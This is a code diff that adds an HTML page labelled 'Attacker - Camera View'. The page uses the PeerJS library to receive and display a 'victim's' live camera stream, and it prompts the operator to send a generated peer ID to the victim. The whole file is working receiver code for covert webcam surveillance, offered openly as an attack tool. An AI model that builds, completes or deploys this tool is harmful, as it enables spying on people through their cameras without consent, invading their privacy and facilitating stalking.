@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Attacker - Camera View</title>
+  </head>
+  <body>
+    <h2>Victim's Camera Feed</h2>
+    <video id="remoteVideo" autoplay playsinline></video>
+
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script>
+      const peer = new Peer(); // generates random ID
+      peer.on("open", (id) => {
+        alert("Send this ID to victim: " + id);
+      });
+
+      peer.on("call", (call) => {
+        call.answer(); // we don't send our own video
+        call.on("stream", (remoteStream) => {
+          document.getElementById("remoteVideo").srcObject = remoteStream;
+        });
+      });
+    </script>
+  </body>
+</html>
